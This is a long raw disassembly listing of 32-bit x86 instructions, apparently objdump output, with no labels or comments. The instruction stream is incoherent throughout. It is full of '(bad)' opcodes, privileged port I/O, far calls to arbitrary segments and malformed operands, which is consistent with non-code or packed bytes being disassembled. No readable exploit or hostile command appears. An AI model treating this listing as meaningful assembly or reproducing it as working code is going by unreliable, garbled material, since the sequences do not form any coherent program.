  420c12:	aad    0xf6
  420c14:	xor    al,0x24
  420c16:	lods   eax,DWORD PTR ds:[esi]
  420c17:	xchg   DWORD PTR [esi+0x652b763a],eax
  420c1d:	push   0x36
  420c1f:	mov    esi,0xabfdb953
  420c24:	push   esi
  420c25:	dec    ecx
  420c26:	bound  edi,QWORD PTR ds:0x52cc6efa
  420c2c:	jnp    0x420bff
  420c2e:	xchg   ecx,eax
  420c2f:	scas   al,BYTE PTR es:[edi]
  420c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c31:	pop    ebp
  420c32:	cmc    
  420c33:	out    0x25,al
  420c35:	jecxz  0x420c87
  420c37:	scas   al,BYTE PTR es:[edi]
  420c38:	and    DWORD PTR [eax-0x158814d4],eax
  420c3e:	mov    edi,0x7c3a0ac1
  420c43:	ins    BYTE PTR es:[edi],dx
  420c44:	xchg   BYTE PTR [edi*4+0x7a400b5d],al
  420c4b:	popa   
  420c4c:	add    eax,DWORD PTR [ecx+0x698fbb14]
  420c52:	cmc    
  420c53:	mov    cs,WORD PTR [edx+0x362b2c04]
  420c59:	cmp    DWORD PTR [eax+0x1b222c78],edi
  420c5f:	lods   al,BYTE PTR ds:[esi]
  420c60:	mov    ds:0xf074b741,al
  420c65:	cli    
  420c66:	ret    0xea5e
  420c69:	test   eax,0x1111251f
  420c6e:	dec    edx
  420c6f:	xor    al,0xe9
  420c71:	dec    ebp
  420c72:	icebp  
  420c73:	rcr    edx,1
  420c75:	or     edi,eax
  420c77:	out    0x48,eax
  420c79:	out    0x4,eax
  420c7b:	pushf  
  420c7c:	push   es
  420c7d:	push   edx
  420c7e:	or     ch,BYTE PTR [eax+0x328cf94f]
  420c84:	mov    al,gs:0xf7f7f3c1
  420c8a:	ret    
  420c8b:	sbb    ebp,DWORD PTR [edx+0x4b]
  420c8e:	pop    ecx
  420c8f:	imul   ecx,DWORD PTR ds:0x9610089a,0xfffffffa
  420c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c97:	pop    ebx
  420c98:	outs   dx,BYTE PTR ds:[esi]
  420c99:	lods   eax,DWORD PTR ds:[esi]
  420c9a:	xor    DWORD PTR [ebp-0x48],ebx
  420c9d:	and    edx,ebp
  420c9f:	sbb    al,0x2b
  420ca1:	cli    
  420ca2:	xchg   edx,eax
  420ca3:	jle    0x420c6e
  420ca5:	and    edi,DWORD PTR [edi-0x55023036]
  420cab:	inc    esp
  420cac:	mov    WORD PTR [eax-0x68],cs
  420caf:	xlat   BYTE PTR ds:[ebx]
  420cb0:	mov    ch,0x37
  420cb2:	call   0xb0ae:0x8e285b55
  420cb9:	dec    eax
  420cba:	inc    ebp
  420cbb:	imul   edx,DWORD PTR [ecx+0x4e],0xffffffaf
  420cbf:	xlat   BYTE PTR ds:[ebx]
  420cc0:	jns    0x420cc7
  420cc2:	adc    ch,ch
  420cc4:	mov    al,ds:0xd1fa5a21
  420cc9:	nop
  420cca:	pop    esi
  420ccb:	sub    dh,BYTE PTR [eax+0x4fb5d268]
  420cd1:	mov    dh,0x43
  420cd3:	bound  ebx,QWORD PTR [edx]
  420cd5:	inc    esi
  420cd6:	inc    ebp
  420cd7:	cmp    dl,BYTE PTR [edi]
  420cd9:	cmp    dl,BYTE PTR cs:[ebx-0x46f7c5de]
  420ce0:	test   al,0x6c
  420ce2:	cmp    ah,BYTE PTR [eax+0x2aace7c0]
  420ce8:	jno    0x420cbd
  420cea:	rol    BYTE PTR [edi+0x4cd06968],0x49
  420cf1:	pop    eax
  420cf2:	cmp    BYTE PTR [edx-0x69],dl
  420cf5:	rcr    BYTE PTR [edx],cl
  420cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cf8:	mov    dl,cl
  420cfa:	std    
  420cfb:	sbb    eax,0x5f3d6954
  420d00:	fld    DWORD PTR ds:0x84a8f3bc
  420d06:	adc    DWORD PTR [esi+0x166d3dd0],ebx
  420d0c:	sbb    al,0x1e
  420d0e:	es adc eax,0x1814a61f
  420d14:	xlat   BYTE PTR ds:[ebx]
  420d15:	pop    edx
  420d16:	cdq    
  420d17:	inc    ebp
  420d18:	mov    dh,0x16
  420d1a:	inc    ecx
  420d1b:	push   es
  420d1c:	shl    edx,0x67
  420d1f:	jne    0x420d8e
  420d21:	(bad)  
  420d22:	jecxz  0x420cda
  420d24:	jae    0x420ca6
  420d26:	es ins BYTE PTR es:[edi],dx
  420d28:	in     al,0xa7
  420d2a:	pop    ebx
  420d2b:	nop
  420d2c:	loop   0x420d40
  420d2e:	rol    BYTE PTR [edx],1
  420d30:	fldenv [ebp+0xf]
  420d33:	mov    BYTE PTR [edx+edi*4-0x5afbaa55],cl
  420d3a:	fidivr WORD PTR [edx-0x62d1c046]
  420d40:	push   ebp
  420d41:	ror    DWORD PTR [esi],cl
  420d43:	xchg   edx,eax
  420d44:	push   edx
  420d45:	idiv   BYTE PTR [ecx]
  420d47:	jmp    0x83e:0xed23a584
  420d4e:	popf   
  420d4f:	scas   eax,DWORD PTR es:[edi]
  420d50:	and    eax,0x2679e4d8
  420d55:	stos   DWORD PTR es:[edi],eax
  420d56:	inc    ebp
  420d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d58:	sub    eax,0x5c3580f6
  420d5d:	cmc    
  420d5e:	sub    al,0xc6
  420d60:	add    dh,BYTE PTR [ecx+0x47]
  420d63:	scas   al,BYTE PTR es:[edi]
  420d64:	rol    DWORD PTR [ecx-0x2b],0xff
  420d68:	(bad)  
  420d6b:	add    cl,BYTE PTR [eax+eax*2-0x6bb4b937]
  420d72:	cmp    edi,ebp
  420d74:	sbb    BYTE PTR [edx+0x43a3eb29],0xe2
  420d7b:	sti    
  420d7c:	sahf   
  420d7d:	in     al,dx
  420d7e:	adc    bl,BYTE PTR [eax+esi*1]
  420d81:	ret    
  420d82:	push   esi
  420d83:	mov    dh,0xbf
  420d85:	jmp    0xfe23580a
  420d8a:	push   eax
  420d8b:	inc    eax
  420d8c:	pop    esi
  420d8d:	xor    DWORD PTR [ebx],ebx
  420d8f:	jmp    0x420dc2
  420d91:	jb     0x420e03
  420d93:	outs   dx,BYTE PTR ds:[esi]
  420d94:	mov    DWORD PTR [edx],ebx
  420d96:	push   0x8cfe9342
  420d9b:	int    0x71
  420d9d:	sub    ebp,DWORD PTR [ecx+eiz*2-0x7d68b467]
  420da4:	ss cmc 
  420da6:	iret   
  420da7:	lea    ebx,[ecx-0x443b1e0]
  420dad:	leave  
  420dae:	jg     0x420d50
  420db0:	popf   
  420db1:	mov    ds:0x277b4eef,al
  420db6:	jl     0x420dc4
  420db8:	jae    0x420d85
  420dba:	xor    bh,0x33
  420dbd:	mov    bh,0x27
  420dbf:	add    al,0xed
  420dc1:	ja     0x420d8f
  420dc3:	(bad)  
  420dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dc5:	icebp  
  420dc6:	fst    DWORD PTR [edx+ecx*4]
  420dc9:	repz mov esi,0xf2a0b9c
  420dcf:	cmp    al,0x30
  420dd1:	mov    ds:0xcd747b2e,al
  420dd6:	test   eax,0x4e9e171a
  420ddb:	cmp    ebx,esp
  420ddd:	adc    DWORD PTR [esp+ebp*4-0x52],ecx
  420de1:	test   eax,0x529d2ea6
  420de6:	sbb    edi,ecx
  420de8:	mov    edi,0x6fbcc56b
  420ded:	popa   
  420dee:	mov    DWORD PTR [edx+0x5a7d50d],eax
  420df4:	enter  0x2aa3,0x1
  420df8:	shl    BYTE PTR [ebx],cl
  420dfa:	ss ret 0xcf1a
  420dfe:	pop    ebx
  420dff:	in     al,dx
  420e00:	xor    eax,0xb6b196f4
  420e05:	mov    bh,0xaa
  420e07:	inc    edx
  420e08:	imul   esp,DWORD PTR [ecx-0x63],0xcd3a3d65
  420e0f:	sar    edx,0x9c
  420e12:	jg     0x420e50
  420e14:	or     al,0x88
  420e16:	pushf  
  420e17:	xor    ch,ch
  420e19:	or     al,0x25
  420e1b:	sub    al,0x6d
  420e1d:	inc    esi
  420e1e:	inc    edx
  420e1f:	retf   0xfa9d
  420e22:	lahf   
  420e23:	fsub   QWORD PTR [edx-0x32738b95]
  420e29:	call   0xa78ace2
  420e2e:	repnz add esi,DWORD PTR [ecx]
  420e31:	inc    esp
  420e32:	nop
  420e33:	push   ds
  420e34:	add    BYTE PTR [esi-0x8e5a8d3],bh
  420e3a:	call   0x82a7:0x9d64094c
  420e41:	bnd jo 0x420e24
  420e44:	pop    es
  420e45:	je     0x420ea7
  420e47:	mov    cs,WORD PTR [ecx-0x5a]
  420e4a:	test   BYTE PTR [ebx-0x5e39f7e5],al
  420e50:	fcom   QWORD PTR [ebx+0x32438d6c]
  420e56:	add    DWORD PTR [edx+0x3ba11528],eax
  420e5c:	cmp    al,0x20
  420e5e:	(bad)  
  420e5f:	jo     0x420e3b
  420e61:	push   ds
  420e62:	cmp    bh,BYTE PTR [edi+0x23]
  420e65:	cmp    BYTE PTR [esi-0x25],bh
  420e68:	add    al,0x3a
  420e6a:	or     esp,edi
  420e6c:	in     eax,dx
  420e6d:	or     dh,BYTE PTR [esi]
  420e6f:	jnp    0x420ecf
  420e71:	and    al,0xf6
  420e73:	fwait
  420e74:	imul   esi
  420e76:	mov    eax,0x453b1062
  420e7b:	sub    al,0xb7
  420e7d:	sub    DWORD PTR [eax],0x34
  420e80:	cdq    
  420e81:	(bad)  
  420e83:	jnp    0x420edb
  420e85:	lods   al,BYTE PTR ds:[esi]
  420e86:	pop    edi
  420e87:	cmp    BYTE PTR [esi-0x62],ah
  420e8a:	hlt    
  420e8b:	or     DWORD PTR [ecx-0x2d95e0f5],esp
  420e91:	push   ds
  420e92:	js     0x420e8c
  420e94:	jns    0x420ebe
  420e96:	outs   dx,BYTE PTR ds:[esi]
  420e97:	sti    
  420e98:	fisttp WORD PTR [edi]
  420e9a:	cwde   
  420e9b:	xor    ch,BYTE PTR ds:0xa3cef414
  420ea1:	push   ds
  420ea2:	rcr    DWORD PTR [edx-0xe],0xca
  420ea6:	mov    ebp,0xd1f22b57
  420eab:	pop    esi
  420eac:	jecxz  0x420e57
  420eae:	call   0x5b4b:0x9700a15c
  420eb5:	arpl   ax,si
  420eb7:	inc    eax
  420eb8:	dec    esi
  420eb9:	sub    dh,BYTE PTR [ebx-0x33]
  420ebc:	dec    ecx
  420ebd:	pop    ecx
  420ebe:	nop
  420ebf:	mov    BYTE PTR [edx],0x93
  420ec2:	cli    
  420ec3:	xor    cl,BYTE PTR [edi]
  420ec5:	add    ah,BYTE PTR [edx+ebx*8-0x63191761]
  420ecc:	pop    es
  420ecd:	xchg   BYTE PTR [edx+0x59aeb074],bl
  420ed3:	pop    edx
  420ed4:	aaa    
  420ed5:	sub    edx,esp
  420ed7:	mov    ?,WORD PTR [esi-0x777ed15]
  420edd:	mov    dh,0x21
  420edf:	cdq    
  420ee0:	scas   al,BYTE PTR es:[edi]
  420ee1:	cdq    
  420ee2:	xlat   BYTE PTR ds:[ebx]
  420ee3:	test   al,0xe8
  420ee5:	inc    edx
  420ee6:	and    al,0x33
  420ee8:	scas   al,BYTE PTR es:[edi]
  420ee9:	fst    QWORD PTR ds:0xef6196ff
  420eef:	not    BYTE PTR [ebp-0x6b]
  420ef2:	or     dl,BYTE PTR [ecx+edx*1+0x4093f8c3]
  420ef9:	sub    al,0x70
  420efb:	xchg   esi,eax
  420efc:	aam    0x11
  420efe:	sub    BYTE PTR [edx-0x4c],0x33
  420f02:	xchg   esi,eax
  420f03:	dec    DWORD PTR [edi-0x33]
  420f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f07:	rcl    DWORD PTR [esi+0x6e],1
  420f0a:	sbb    bl,cl
  420f0c:	jge    0x420f35
  420f0e:	ss inc edi
  420f10:	add    dh,bl
  420f12:	xchg   ebp,ebx
  420f14:	hlt    
  420f15:	mov    al,0xba
  420f17:	(bad)  
  420f18:	xor    BYTE PTR ds:0x9d71bdb,cl
  420f1e:	push   edx
  420f1f:	push   esi
  420f20:	lahf   
  420f21:	fcomp  QWORD PTR [esi+esi*1+0x10]
  420f25:	jmp    0x2e6cdcee
  420f2a:	dec    ecx
  420f2b:	(bad)  
  420f2c:	test   DWORD PTR [eax+0x418433e6],0x9d54d833
  420f36:	push   ds
  420f37:	add    edi,esi
  420f39:	ds xchg ecx,eax
  420f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f3c:	mov    ch,0xdf
  420f3e:	xor    eax,ecx
  420f40:	rcl    BYTE PTR [ebx+0x4a6f6f4e],cl
  420f46:	mov    bh,0x6d
  420f48:	dec    ebp
  420f49:	mov    ecx,0x3c7c8369
  420f4e:	mov    eax,0xbeb10ef2
  420f53:	jl     0x420f7a
  420f55:	pop    edi
  420f56:	adc    edx,DWORD PTR [eax]
  420f58:	dec    edx
  420f59:	pop    es
  420f5a:	jge    0x420ef8
  420f5c:	jp     0x420f82
  420f5e:	fist   DWORD PTR [ecx]
  420f60:	int    0x3b
  420f62:	jmp    0xece8:0x9c64d878
  420f69:	sahf   
  420f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f6b:	jecxz  0x420feb
  420f6d:	mov    ecx,0x16f3bed8
  420f72:	xchg   ebx,eax
  420f73:	adc    edx,0x308ffcbf
  420f79:	inc    ecx
  420f7a:	into   
  420f7b:	inc    esi
  420f7c:	hlt    
  420f7d:	mov    esi,0x49064da7
  420f82:	xchg   edx,eax
  420f83:	inc    edx
  420f84:	adc    eax,DWORD PTR [ebx+0xcce432a]
  420f8a:	mov    ah,0x80
  420f8c:	sbb    al,0x49
  420f8e:	outs   dx,BYTE PTR ds:[esi]
  420f8f:	pop    esi
  420f90:	pusha  
  420f91:	adc    eax,0x222e044a
  420f96:	(bad)  
  420f98:	cwde   
  420f99:	lods   eax,DWORD PTR ds:[esi]
  420f9a:	(bad)  
  420f9b:	retf   0x10f5
  420f9e:	cmp    al,BYTE PTR [ebp-0xd]
  420fa1:	pop    edx
  420fa2:	add    al,0x1b
  420fa4:	pusha  
  420fa5:	mov    ebp,0x90e4395d
  420faa:	fimul  WORD PTR [eax]
  420fac:	mov    al,0xc1
  420fae:	gs push edi
  420fb0:	mov    WORD PTR [edx],?
  420fb2:	shl    DWORD PTR [esi+0x36],cl
  420fb5:	xor    ecx,DWORD PTR [eax+0x9]
  420fb8:	and    eax,0x393e5716
  420fbd:	cmp    edx,eax
  420fbf:	pop    ecx
  420fc0:	mov    edi,0x224206e3
  420fc5:	sbb    eax,0xe3675112
  420fca:	les    ebp,FWORD PTR [esi-0x61cb8ce2]
  420fd0:	xchg   ebp,eax
  420fd1:	inc    esi
  420fd2:	push   0x4f123910
  420fd7:	cmc    
  420fd8:	push   eax
  420fd9:	test   eax,0x92dbca53
  420fde:	dec    edi
  420fdf:	xor    al,0x21
  420fe1:	out    0xe4,al
  420fe3:	cmp    ch,ah
  420fe5:	cmp    DWORD PTR [eax],edi
  420fe7:	inc    ebp
  420fe8:	mov    ds:0xf0ae92a7,eax
  420fed:	bound  edx,QWORD PTR [ebx]
  420fef:	bound  ebp,QWORD PTR [eax]
  420ff1:	dec    esp
  420ff2:	sub    BYTE PTR [eax-0x25724631],bl
  420ff8:	aaa    
  420ff9:	push   edx
  420ffa:	push   eax
  420ffb:	and    dl,cl
  420ffd:	int    0xe9
  420fff:	dec    edi
  421000:	scas   eax,DWORD PTR es:[edi]
  421001:	inc    ebp
  421002:	cld    
  421003:	test   BYTE PTR [ebx+eiz*1+0xdf4d97a],cl
  42100a:	and    bl,BYTE PTR [eax]
  42100c:	imul   dl
  42100e:	xor    DWORD PTR [edx-0x31e2e96b],esi
  421014:	xchg   edx,edi
  421016:	test   al,0xb0
  421018:	and    edx,DWORD PTR [ecx-0x7d7b23c0]
  42101e:	rol    BYTE PTR [esi-0x4c],1
  421021:	call   0xfeec:0x51913998
  421028:	cmc    
  421029:	cmc    
  42102a:	addr16 and al,0xbc
  42102d:	repnz mov eax,0x4aa63b31
  421033:	xor    dh,dl
  421035:	pop    edi
  421036:	test   BYTE PTR [ebp-0x5],cl
  421039:	jge    0x421092
  42103b:	mov    ecx,ecx
  42103d:	sub    BYTE PTR [esi],0x10
  421040:	sar    BYTE PTR [ecx-0xc96c8d3],cl
  421046:	scas   al,BYTE PTR es:[edi]
  421047:	mov    WORD PTR [esi],fs
  421049:	xor    BYTE PTR [ecx+0x1f],ch
  42104c:	ja     0x4210a6
  42104e:	test   al,0x17
  421050:	arpl   WORD PTR [edi],di
  421052:	(bad)  
  421053:	cmp    esi,ebp
  421055:	mov    edx,0xd8a588a4
  42105a:	and    DWORD PTR [ebp+0x6a],ecx
  42105d:	neg    BYTE PTR [eax-0x2c]
  421060:	das    
  421061:	inc    eax
  421062:	dec    ebp
  421063:	(bad)  
  421064:	and    edi,DWORD PTR [edx-0xc622632]
  42106a:	cmp    DWORD PTR [esi+0x7a31089e],edx
  421070:	mov    edi,DWORD PTR [ecx+0x5c]
  421073:	dec    eax
  421074:	sub    bl,BYTE PTR [esi-0x2d]
  421077:	loop   0x421034
  421079:	fnstcw WORD PTR [esi]
  42107b:	cmp    DWORD PTR [ecx],0xffffffbb
  42107e:	into   
  42107f:	mov    ebp,0xebbac520
  421084:	sahf   
  421085:	xchg   ecx,eax
  421086:	call   0x6a10:0x5eb99f1e
  42108d:	out    dx,eax
  42108e:	retf   
  42108f:	int    0xbc
  421091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421092:	and    eax,0x12baf6a2
  421097:	xchg   edx,eax
  421098:	repnz pop edi
  42109a:	ja     0x421089
  42109c:	push   DWORD PTR [ebx]
  42109e:	mov    al,ds:0xd9764a4e
  4210a3:	xor    ebp,DWORD PTR [ecx+0x47]
  4210a6:	test   al,0xe9
  4210a8:	clc    
  4210a9:	jae    0x4210b3
  4210ab:	fdiv   st,st(3)
  4210ad:	pop    esi
  4210ae:	dec    ebp
  4210af:	mov    edx,0x5df944b5
  4210b4:	sar    DWORD PTR [edx],1
  4210b6:	pusha  
  4210b7:	and    eax,0xd9ea3f22
  4210bc:	call   0x5884:0x66001a3f
  4210c3:	adc    esi,DWORD PTR [eax-0x7b]
  4210c6:	fwait
  4210c7:	xchg   ecx,eax
  4210c8:	popf   
  4210c9:	out    dx,eax
  4210ca:	ss loope 0x42109e
  4210cd:	(bad)  
  4210ce:	cmp    cl,BYTE PTR [ebp-0x5f]
  4210d1:	stos   DWORD PTR es:[edi],eax
  4210d2:	mov    DWORD PTR [esi+0x64],esp
  4210d5:	pop    esp
  4210d6:	push   esp
  4210d7:	in     eax,0x4b
  4210d9:	leave  
  4210da:	sar    BYTE PTR [ebp-0x43],0x4c
  4210de:	outs   dx,BYTE PTR ds:[esi]
  4210df:	sub    al,0x84
  4210e1:	push   edi
  4210e2:	sbb    bl,BYTE PTR [edx+ebx*1-0x22c18d7e]
  4210e9:	jl     0x4210c5
  4210eb:	int    0x4a
  4210ed:	mov    dh,0x89
  4210ef:	adc    al,0x1d
  4210f1:	into   
  4210f2:	jno    0x421123
  4210f4:	popf   
  4210f5:	inc    edi
  4210f6:	jo     0x421106
  4210f8:	adc    al,0x7f
  4210fa:	scas   al,BYTE PTR es:[edi]
  4210fb:	fild   WORD PTR [ebx+0x35]
  4210fe:	ret    0x8f2d
  421101:	inc    esi
  421102:	dec    eax
  421103:	inc    edi
  421104:	and    al,0xc8
  421106:	imul   esi,DWORD PTR ss:[ecx+0x58c5eb2c],0x72
  42110e:	stos   DWORD PTR es:[edi],eax
  42110f:	in     eax,dx
  421110:	pop    edi
  421111:	cmp    DWORD PTR [edi-0x69],edx
  421114:	adc    eax,0x6c6ef11e
  421119:	jge    0x421118
  42111b:	ins    BYTE PTR es:[edi],dx
  42111c:	inc    ebp
  42111d:	lods   eax,DWORD PTR ds:[esi]
  42111e:	push   0x1b36cdec
  421123:	jmp    0x421168
  421125:	pop    eax
  421126:	mov    ds:0x989df586,al
  42112b:	sub    ebx,ecx
  42112d:	xchg   ebx,eax
  42112e:	fild   DWORD PTR [edi+0x37a6fab7]
  421134:	stc    
  421135:	int    0xe0
  421137:	sbb    bh,bl
  421139:	icebp  
  42113a:	cdq    
  42113b:	(bad)  
  42113c:	mov    edi,0x1ff084de
  421141:	inc    ebp
  421142:	fbld   TBYTE PTR cs:[eax+ebp*2]
  421146:	nop
  421147:	stos   BYTE PTR es:[edi],al
  421148:	adc    DWORD PTR [eax+0x2e09187a],ecx
  42114e:	dec    ebx
  42114f:	ret    
  421150:	(bad)  
  421151:	cmp    eax,DWORD PTR [ebx]
  421153:	jge    0x42110b
  421155:	fs cld 
  421157:	cli    
  421158:	shl    DWORD PTR [ecx-0x7d88694f],1
  42115e:	in     al,0x8f
  421160:	addr16 push 0x371bad99
  421166:	ins    DWORD PTR es:[edi],dx
  421167:	shl    DWORD PTR [edi-0x9],0x87
  42116b:	ins    DWORD PTR es:[edi],dx
  42116c:	cmp    ah,cl
  42116e:	jge    0x421109
  421170:	call   0xa323a2bb
  421175:	jge    0x42115d
  421177:	(bad)  
  421178:	cmp    DWORD PTR [edx-0x1c1837bb],eax
  42117e:	cld    
  42117f:	xchg   esp,eax
  421180:	test   DWORD PTR [edi+0x58495e8],edx
  421186:	fstp   st(4)
  421188:	test   eax,0x5146e922
  42118d:	jno    0x421146
  42118f:	arpl   WORD PTR [esi+0x68c0f595],sp
  421195:	out    0xaa,al
  421197:	rcl    BYTE PTR [edi+0x5d],0xb1
  42119b:	sub    al,0x3a
  42119d:	xchg   ebp,eax
  42119e:	cwde   
  42119f:	sbb    eax,0x88c2c52e
  4211a4:	pop    ebp
  4211a5:	test   al,0xfc
  4211a7:	xchg   ebp,eax
  4211a8:	les    edx,FWORD PTR [ebx]
  4211aa:	xlat   BYTE PTR ds:[ebx]
  4211ab:	adc    BYTE PTR [esi+0x7982cee0],dl
  4211b1:	push   ecx
  4211b2:	pop    ebx
  4211b3:	and    eax,0xd0592d71
  4211b8:	imul   edx,esi,0xffffffa0
  4211bb:	mov    al,ds:0x344667eb
  4211c0:	push   cs
  4211c1:	sub    dh,BYTE PTR [ecx+0x5cecc9b5]
  4211c7:	jns    0x42114c
  4211c9:	inc    edx
  4211ca:	std    
  4211cb:	push   eax
  4211cc:	scas   al,BYTE PTR es:[edi]
  4211cd:	int    0x25
  4211cf:	jae    0x421160
  4211d1:	sub    al,0x1e
  4211d3:	(bad)  
  4211d4:	bound  eax,QWORD PTR [ecx+0x62]
  4211d7:	xor    dl,cl
  4211d9:	mov    cl,0x95
  4211db:	pop    ds
  4211dc:	mov    edi,0xd35ac3be
  4211e1:	xchg   edi,eax
  4211e2:	xchg   esp,edi
  4211e4:	push   0xfe43a382
  4211e9:	adc    al,0x9
  4211eb:	in     al,dx
  4211ec:	xor    al,0xb1
  4211ee:	jne    0x421178
  4211f0:	pop    ecx
  4211f1:	inc    ecx
  4211f2:	pop    ebx
  4211f3:	xchg   edi,eax
  4211f4:	(bad)  
  4211f6:	aas    
  4211f7:	sub    eax,0x4708711a
  4211fc:	test   BYTE PTR [ebp+esi*2+0x34027711],0xcb
  421204:	sbb    edi,ebp
  421206:	xchg   ebp,eax
  421207:	mov    edx,0x3e04eac0
  42120c:	inc    esp
  42120d:	mov    ds:0x76ec45d7,al
  421212:	into   
  421213:	neg    DWORD PTR [ecx+0x67]
  421216:	dec    esi
  421217:	mov    DWORD PTR ds:0x7b2e1f15,edx
  42121d:	je     0x421286
  42121f:	fwait
  421220:	mov    WORD PTR [esi+ebp*2+0x789cfd66],es
  421227:	leave  
  421228:	cmp    bl,bh
  42122a:	pop    ebx
  42122b:	inc    ebp
  42122c:	div    esi
  42122e:	pop    eax
  42122f:	ret    0xbef1
  421232:	adc    bl,BYTE PTR fs:[esp+edx*4-0x28]
  421237:	mov    eax,0xe560ee1e
  42123c:	push   0x4019da8c
  421241:	dec    esp
  421242:	push   0xffffffac
  421244:	xchg   DWORD PTR [ebp+0x70],ebx
  421247:	add    bl,BYTE PTR [ecx+0x10]
  42124a:	lds    ecx,FWORD PTR [ebp+0x7521323a]
  421250:	loope  0x4212b7
  421252:	enter  0x8ad6,0xa6
  421256:	das    
  421257:	cmp    bl,al
  421259:	pop    esp
  42125a:	and    BYTE PTR [ebx-0xdd96f08],bl
  421260:	sub    DWORD PTR [edx+esi*1+0x64],ebp
  421264:	enter  0x1c82,0xd7
  421268:	xor    DWORD PTR [ecx-0x63],edi
  42126b:	je     0x4212bf
  42126d:	(bad)  
  42126e:	in     eax,0x45
  421270:	inc    ecx
  421271:	mov    cl,0x85
  421273:	and    ch,BYTE PTR [eax]
  421275:	icebp  
  421276:	idiv   dh
  421278:	add    bl,BYTE PTR [eax+esi*2+0x63]
  42127c:	cmp    BYTE PTR [ebp+0x36],al
  42127f:	gs sti 
  421281:	test   BYTE PTR [edi+0x46],ch
  421284:	cmp    bh,BYTE PTR [ebx+eax*2+0x5f6cec4]
  42128b:	dec    eax
  42128c:	xor    bl,bh
  42128e:	xor    eax,0xf27d5712
  421293:	xor    BYTE PTR [ecx+esi*8-0x130926e2],dl
  42129a:	sub    eax,0x74efde6
  42129f:	fadd   QWORD PTR [edx+edx*4]
  4212a2:	xchg   ebx,eax
  4212a3:	inc    ebp
  4212a4:	mov    ah,0x60
  4212a6:	mov    BYTE PTR [eax+0x7a2252da],bl
  4212ac:	fnstcw WORD PTR [eax+ecx*8+0x4a1654c6]
  4212b3:	dec    ecx
  4212b4:	lock or BYTE PTR ds:0xe3978532,0x26
  4212bc:	pmaxsw mm6,QWORD PTR [edi+edi*8+0x7e]
  4212c1:	mov    esi,0x40fd5ea2
  4212c6:	pop    ebx
  4212c7:	in     eax,dx
  4212c8:	enter  0x8b99,0x4
  4212cc:	int3   
  4212cd:	jmp    0xef5dbee7
  4212d2:	add    eax,0xc19832e9
  4212d7:	jp     0x4212f3
  4212d9:	and    al,0xa9
  4212db:	repnz dec edi
  4212dd:	outs   dx,DWORD PTR ds:[esi]
  4212de:	pop    esp
  4212df:	mov    ebp,ebx
  4212e1:	xor    eax,0x8b66e655
  4212e6:	int3   
  4212e7:	push   esp
  4212e8:	adc    eax,0x4de172a9
  4212ed:	int3   
  4212ee:	test   DWORD PTR [ebp-0x55b16d80],eax
  4212f4:	cmp    eax,0xef618f67
  4212f9:	adc    eax,0x65c39134
  4212fe:	in     eax,0x84
  421300:	xchg   al,bh
  421302:	out    dx,eax
  421303:	xchg   edi,eax
  421304:	cmp    BYTE PTR [ebx+ecx*1-0x25],dl
  421308:	xor    eax,0x952db5e8
  42130d:	push   esp
  42130e:	iret   
  42130f:	cmp    DWORD PTR [eax],ebx
  421311:	aaa    
  421312:	add    DWORD PTR [ecx-0x3d45e96a],0xece5bddc
  42131c:	sbb    eax,0x998f7a84
  421321:	scas   al,BYTE PTR es:[edi]
  421322:	adc    eax,0xe6e6a0d6
  421327:	push   esi
  421328:	mov    bl,0x38
  42132a:	(bad)  
  42132b:	mov    ch,0x95
  42132d:	or     eax,0x106ecedc
  421332:	imul   esi,DWORD PTR [eax],0x7301a33e
  421338:	mov    edx,0x7700e1d2
  42133d:	mov    esp,0x362aef89
  421342:	cld    
  421343:	test   DWORD PTR [eax],ebp
  421345:	mov    WORD PTR [edi+0x2fb9aae0],fs
  42134b:	loope  0x4213c4
  42134d:	fcmovnbe st,st(6)
  42134f:	mov    ecx,ebp
  421351:	cmc    
  421352:	dec    eax
  421353:	xchg   BYTE PTR [esi+0x3c4aea80],dl
  421359:	cmp    DWORD PTR [esi],ebp
  42135b:	iret   
  42135c:	popa   
  42135d:	xchg   esi,eax
  42135e:	push   eax
  42135f:	lock in al,0xcd
  421362:	js     0x421377
  421364:	inc    eax
  421366:	mov    al,ds:0x50a61c8a
  42136b:	js     0x42137a
  42136d:	inc    edi
  42136e:	cmp    dl,BYTE PTR [ecx+ecx*2+0x1e]
  421372:	rol    ah,0xa2
  421375:	les    ecx,FWORD PTR [eax]
  421377:	sub    al,BYTE PTR [edi+0x30a3f13b]
  42137d:	pushf  
  42137e:	aas    
  42137f:	arpl   bx,dx
  421381:	js     0x421377
  421383:	mov    al,ds:0x25b4f1b
  421388:	xchg   esi,eax
  421389:	js     0x421371
  42138b:	mov    ds:0xd2bbd43d,eax
  421390:	aam    0x69
  421392:	mov    ebp,0x4cec1472
  421397:	xchg   esp,eax
  421398:	sub    BYTE PTR [esi+0x4e],bh
  42139b:	push   edi
  42139c:	cmp    DWORD PTR [edx+edi*1+0x1917fa08],ecx
  4213a3:	fld    TBYTE PTR [edi+0x5c1adedc]
  4213a9:	sti    
  4213aa:	aas    
  4213ab:	add    eax,0x4da889e4
  4213b0:	mov    eax,ds:0x26c26957
  4213b5:	popf   
  4213b6:	mov    DWORD PTR [edi],0x3591eb1a
  4213bc:	adc    al,0x65
  4213be:	in     eax,dx
  4213bf:	dec    eax
  4213c0:	cld    
  4213c1:	out    0xf3,al
  4213c3:	int    0xea
  4213c5:	ja     0x421348
  4213c7:	pop    es
  4213c8:	pop    edx
  4213c9:	push   edi
  4213ca:	xchg   esp,eax
  4213cb:	lahf   
  4213cc:	ret    0x22c3
  4213cf:	cld    
  4213d0:	ss into 
  4213d2:	xor    DWORD PTR [eax],edx
  4213d4:	mov    cl,0xb0
  4213d6:	mov    ds:0xd330c71f,eax
  4213db:	push   es
  4213dc:	les    ebp,FWORD PTR [eax]
  4213de:	push   ecx
  4213df:	push   0xffffffff
  4213e1:	scas   eax,DWORD PTR es:[edi]
  4213e2:	jnp    0x421411
  4213e4:	cmp    al,0xab
  4213e6:	xchg   edx,eax
  4213e7:	sub    dh,BYTE PTR [edx]
  4213e9:	cs das 
  4213eb:	idiv   BYTE PTR [eax]
  4213ed:	test   ch,ch
